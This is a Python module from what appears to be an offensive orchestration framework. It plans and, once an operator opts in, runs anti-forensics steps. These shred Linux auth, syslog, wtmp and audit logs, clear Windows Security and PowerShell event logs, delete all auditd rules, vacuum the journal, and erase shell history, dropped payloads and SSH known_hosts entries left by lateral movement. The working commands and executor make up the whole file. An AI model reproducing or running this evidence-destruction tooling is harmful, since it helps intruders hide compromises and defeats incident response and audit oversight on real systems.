"""orchestrator.evasion.antiforensics — planning-only artifact cleanup.

Design rule: this module NEVER executes anything by itself. It produces
`AntiforensicsStep` records and shell text that an operator may review and
run. Execution requires an explicit double opt-in:

    RAPHAEL_AF_EXECUTE=1
    confirm == "I-ACCEPT-DESTRUCTIVE-WIPES"
    and every destructive step must be separately allowed

Binaries referenced (srm, wipe, bleachbit, shred, journalctl, auditctl, fls)
are declared in configs/tool-catalog.json under category "antiforensics".
"""
from __future__ import annotations

import os
import subprocess
from dataclasses import asdict, dataclass
from typing import Iterable, Sequence

CONFIRM_TOKEN = "I-ACCEPT-DESTRUCTIVE-WIPES"

LINUX_LOGS = (
    "/var/log/syslog", "/var/log/auth.log", "/var/log/kern.log",
    "/var/log/lastlog", "/var/log/wtmp", "/var/log/btmp", "/var/log/messages",
)
WINDOWS_LOGS = ("Security", "System", "Application", "Windows PowerShell",
                "Microsoft-Windows-PowerShell/Operational")
BROWSER_CACHES = {
    "chrome": ["~/.config/google-chrome/Default/Cache",
               "~/.cache/google-chrome"],
    "firefox": ["~/.cache/mozilla/firefox", "~/.mozilla/firefox/*/cache2"],
}


class AntiforensicsLocked(RuntimeError):
    """Raised when execution is attempted without the operator opt-in."""


@dataclass(frozen=True)
class AntiforensicsStep:
    id: str
    command: str
    reason: str
    category: str          # history|logs|journal|audit|artifacts|timestomp|network
    platform: str          # linux|windows|any
    destructive: bool
    requires_root: bool
    idempotent: bool

    def to_dict(self) -> dict:
        return asdict(self)


def _step(**kw) -> AntiforensicsStep:
    return AntiforensicsStep(**kw)


# --------------------------------------------------------------------- planners

def history_scrub(shells: Sequence[str] = ("bash", "zsh")) -> list[AntiforensicsStep]:
    out = [
        _step(id="history.clear", command="history -c 2>/dev/null || true",
              reason="drop the in-memory command history of the current shell",
              category="history", platform="linux", destructive=False,
              requires_root=False, idempotent=True),
        _step(id="history.no-file", command="export HISTFILE=/dev/null; unset HISTFILE",
              reason="stop the session from persisting further history",
              category="history", platform="linux", destructive=False,
              requires_root=False, idempotent=True),
    ]
    for sh in shells:
        out.append(_step(
            id=f"history.shred-{sh}",
            command=f"shred -uvz -n 3 ~/.{sh}_history 2>/dev/null || true",
            reason=f"destroy persisted {sh} history",
            category="history", platform="linux", destructive=True,
            requires_root=False, idempotent=True))
    return out


def log_wipe(targets: Iterable[str] | None = None,
             platform: str = "linux") -> list[AntiforensicsStep]:
    if platform == "windows":
        return [_step(
            id="logs.wevtutil",
            command=" ; ".join(f"wevtutil cl '{name}' 2>$null" for name in WINDOWS_LOGS),
            reason="clear Windows event logs",
            category="logs", platform="windows", destructive=True,
            requires_root=True, idempotent=True)]

    paths = list(targets) if targets else list(LINUX_LOGS)
    steps = []
    for path in paths:
        name = os.path.basename(path)
        steps.append(_step(
            id=f"logs.{name}",
            command=f"shred -uvz -n 3 {path} 2>/dev/null || true",
            reason=f"destroy {path}",
            category="logs", platform="linux", destructive=True,
            requires_root=True, idempotent=True))
    return steps


def journal_vacuum(seconds: int = 1) -> list[AntiforensicsStep]:
    return [
        _step(id="journal.rotate",
              command="journalctl --rotate 2>/dev/null || true",
              reason="seal the active journal so the vacuum can drop it",
              category="journal", platform="linux", destructive=True,
              requires_root=True, idempotent=True),
        _step(id="journal.vacuum",
              command=f"journalctl --vacuum-time={max(1, int(seconds))}s 2>/dev/null || true",
              reason=f"drop journal entries older than {seconds}s",
              category="journal", platform="linux", destructive=True,
              requires_root=True, idempotent=True),
    ]


def auditd_wipe() -> list[AntiforensicsStep]:
    return [
        _step(id="audit.stop",
              command="auditctl -D 2>/dev/null || true",
              reason="remove all audit watch rules",
              category="audit", platform="linux", destructive=False,
              requires_root=True, idempotent=True),
        _step(id="audit.log",
              command="shred -uvz -n 3 /var/log/audit/audit.log 2>/dev/null || true",
              reason="destroy the audit trail",
              category="audit", platform="linux", destructive=True,
              requires_root=True, idempotent=True),
    ]


def kernel_cache_drop() -> list[AntiforensicsStep]:
    return [_step(
        id="kernel.drop-caches",
        command="sync; echo 3 > /proc/sys/vm/drop_caches",
        reason="evict page cache, inode cache and dentries (removes recent file traces from RAM)",
        category="artifacts", platform="linux", destructive=False,
        requires_root=True, idempotent=True)]


def browser_cache_clean(browsers: Sequence[str] = ("chrome", "firefox")) -> list[AntiforensicsStep]:
    steps = []
    for name in browsers:
        paths = BROWSER_CACHES.get(name, [])
        if not paths:
            continue
        steps.append(_step(
            id=f"browser.{name}",
            command="rm -rf " + " ".join(paths),
            reason=f"remove {name} cache and profile residue",
            category="artifacts", platform="linux", destructive=True,
            requires_root=False, idempotent=True))
    return steps


def artifact_clean(paths: Iterable[str] | None = None) -> list[AntiforensicsStep]:
    defaults = ["/tmp/*", "/var/tmp/*", "~/.cache/*", "~/.local/share/recently-used.xbel"]
    selected = list(paths) if paths else defaults
    return [_step(
        id="artifacts.tmp",
        command="rm -rf " + " ".join(selected),
        reason="remove staging files, caches and recent-document residue",
        category="artifacts", platform="linux", destructive=True,
        requires_root=False, idempotent=True)]


def secure_delete(paths: Sequence[str], passes: int = 3) -> list[AntiforensicsStep]:
    if not paths:
        return []
    return [_step(
        id="artifacts.secure-delete",
        command=f"srm -rf -v {' '.join(paths)}  # {passes}-pass overwrite (secure-delete)",
        reason="overwrite and unlink dropped payloads instead of plain rm",
        category="artifacts", platform="linux", destructive=True,
        requires_root=False, idempotent=False)]


def known_hosts_prune() -> list[AntiforensicsStep]:
    return [_step(
        id="network.known-hosts",
        command="shred -uvz -n 3 ~/.ssh/known_hosts 2>/dev/null || true",
        reason="remove SSH host fingerprints that reveal prior lateral movement",
        category="network", platform="linux", destructive=True,
        requires_root=False, idempotent=True)]


PROFILES = {
    "minimal": ("history",),
    "standard": ("history", "logs", "journal", "audit", "artifacts", "network"),
    "full": ("history", "logs", "journal", "audit", "artifacts", "network", "browser"),
}


def plan(profile: str = "standard", platform: str = "linux") -> list[AntiforensicsStep]:
    """Return the ordered step list for a profile. Never executes."""
    categories = PROFILES.get(profile, PROFILES["standard"])
    steps: list[AntiforensicsStep] = []
    if "history" in categories:
        steps += history_scrub()
    if "logs" in categories:
        steps += log_wipe(platform=platform)
    if "journal" in categories:
        steps += journal_vacuum()
    if "audit" in categories:
        steps += auditd_wipe()
    if "artifacts" in categories:
        steps += kernel_cache_drop() + artifact_clean()
    if "network" in categories:
        steps += known_hosts_prune()
    if "browser" in categories:
        steps += browser_cache_clean()
    # platform filter
    return [s for s in steps if s.platform in (platform, "any")]


def render_script(steps: Sequence[AntiforensicsStep], platform: str = "linux",
                  shebang: bool = True) -> str:
    """Render a reviewable shell script. Pure string building — no execution."""
    lines: list[str] = []
    if shebang:
        lines.append("#!/usr/bin/env bash")
        lines.append("# GENERATED — review before running. Destructive steps are marked.")
    for s in steps:
        mark = "DESTRUCTIVE" if s.destructive else "safe"
        lines.append(f"# [{s.category}/{mark}] {s.id}: {s.reason}")
        lines.append(s.command)
    return "\n".join(lines) + "\n"


def execute(steps: Sequence[AntiforensicsStep], *, confirm: str,
            allow_destructive: bool = False, timeout: int = 60) -> list[dict]:
    """Run the plan. Locked unless the operator opted in twice."""
    if os.environ.get("RAPHAEL_AF_EXECUTE") != "1":
        raise AntiforensicsLocked(
            "RAPHAEL_AF_EXECUTE != 1 — anti-forensics execution is disabled (dry-run default)")
    if confirm != CONFIRM_TOKEN:
        raise AntiforensicsLocked(
            f"confirmation token mismatch; expected {CONFIRM_TOKEN!r}")
    if not allow_destructive and any(s.destructive for s in steps):
        raise AntiforensicsLocked(
            "plan contains destructive steps; pass allow_destructive=True to accept")

    results = []
    for s in steps:
        try:
            proc = subprocess.run(s.command, shell=True, capture_output=True,
                                  text=True, timeout=timeout)
            results.append({"id": s.id, "rc": proc.returncode,
                            "stdout": proc.stdout[-500:], "stderr": proc.stderr[-500:]})
        except Exception as e:  # noqa: BLE001
            results.append({"id": s.id, "rc": -1, "error": repr(e)})
    return results
